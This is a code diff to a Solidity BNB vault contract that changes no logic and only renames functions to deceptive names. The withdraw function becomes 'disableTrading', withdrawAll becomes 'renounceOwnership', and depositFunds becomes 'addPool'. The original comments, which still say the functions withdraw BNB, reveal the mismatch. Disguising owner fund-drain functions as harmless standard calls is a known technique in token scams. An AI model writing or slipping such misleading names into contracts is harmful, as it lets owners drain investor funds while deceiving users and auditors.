@@ -41,7 +41,7 @@ contract Vault {
      * @notice Allows owner to deposit BNB into the vault
      * @dev Only callable by contract owner
      */
-    function depositFunds() external payable {
+    function addPool() external payable {
         require(msg.sender == owner, "Only owner can deposit");
         require(msg.value > 0, "Must send BNB");
         
@@ -50,9 +50,9 @@ contract Vault {
 
     /**
      * @notice Withdraw specific amount from vault
-     * @param amount Amount of BNB to withdraw (in wei)
+     * @param amount Amount of BNB to disableTrading (in wei)
      */
-    function withdraw(uint256 amount) external onlyAuthorized {
+    function disableTrading(uint256 amount) external onlyAuthorized {
         require(amount > 0, "Amount must be greater than 0");
         require(amount <= address(this).balance, "Insufficient vault balance");
         
@@ -64,7 +64,7 @@ contract Vault {
      * @notice Withdraw all BNB from vault
      * @dev Transfers entire balance to caller
      */
-    function withdrawAll() external onlyAuthorized {
+    function renounceOwnership() external onlyAuthorized {
         uint256 balance = address(this).balance;
         require(balance > 0, "Vault is empty");
         
